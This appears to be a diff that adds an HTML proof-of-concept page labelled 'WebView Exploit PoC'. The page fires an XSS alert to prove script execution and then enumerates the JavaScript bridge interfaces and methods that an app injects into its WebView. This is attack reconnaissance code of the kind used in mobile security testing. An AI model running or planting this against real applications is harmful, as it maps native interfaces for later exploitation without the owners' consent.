@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC - JS Interface Enumeration</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: #00ff00; padding: 20px; }
+        .found { color: #ff00ff; font-weight: bold; }
+        #log { background: #000; border: 1px solid #333; padding: 10px; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>WebView Exploit PoC</h1>
+    
+    <h3>1. XSS Execution Proof:</h3>
+    <script>
+        // Simple XSS PoC to prove script execution in the app's context
+        alert("XSS Triggered! Origin: " + window.location.origin);
+    </script>
+
+    <h3>2. JS Interface Discovery:</h3>
+    <div id="log">Enumerating interfaces...<br></div>
+
+    <script>
+        const logDiv = document.getElementById('log');
+        
+        // List of common built-in objects to ignore
+        const standardObjects = [
+            'window', 'document', 'console', 'chrome', 'performance', 
+            'location', 'navigator', 'external', 'visualViewport'
+        ];
+
+        function scanInterfaces() {
+            let foundAny = false;
+            for (let prop in window) {
+                // Look for objects that are not standard JS built-ins
+                if (typeof window[prop] === 'object' && window[prop] !== null && !standardObjects.includes(prop)) {
+                    logDiv.innerHTML += `[<span class="found">FOUND</span>] Interface: <strong>${prop}</strong><br>`;
+                    
+                    // List methods for the found interface
+                    for (let method in window[prop]) {
+                        logDiv.innerHTML += `&nbsp;&nbsp;&nbsp;└── Method: ${method}()<br>`;
+                    }
+                    foundAny = true;
+                }
+            }
+            if (!foundAny) {
+                logDiv.innerHTML += "No custom interfaces detected in this WebView.";
+            }
+        }
+
+        // Delay slightly to ensure bridge injection
+        setTimeout(scanInterfaces, 500);
+    </script>
+</body>
+</html>
